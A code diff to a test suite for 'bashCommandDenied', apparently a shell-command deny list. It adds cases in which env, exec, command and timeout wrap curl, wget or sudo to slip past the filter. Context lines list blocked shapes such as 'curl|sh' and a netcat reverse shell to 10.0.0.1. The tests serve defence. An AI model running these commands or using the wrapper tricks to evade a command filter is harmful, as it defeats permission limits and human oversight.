@@ -12,6 +12,16 @@ describe('bashCommandDenied', () => {
   it('blocks network, privilege and destructive shapes in any spacing', () => {
     for (const cmd of [
       'curl https://x',
+      'env curl https://x',
+      'env -i X=1 /usr/bin/curl https://x',
+      'env -u HOME curl https://x',
+      'env --chdir /tmp curl https://x',
+      'exec -a innocent curl https://x',
+      "env -S 'curl https://x'",
+      'command sudo id',
+      'command -p wget x',
+      'X="a b" exec /usr/bin/curl x',
+      'timeout 10 curl x',
       'curl|sh',
       'wget -qO- x',
       'nc -e /bin/sh 10.0.0.1 4444',
@@ -41,6 +51,8 @@ describe('bashCommandDenied', () => {
   it('allows ordinary in-project commands', () => {
     for (const cmd of [
       'bun test',
+      'env CI=1 bun test',
+      'command git status',
       'ls -la',
       'grep -r foo src',
       'cat package.json',
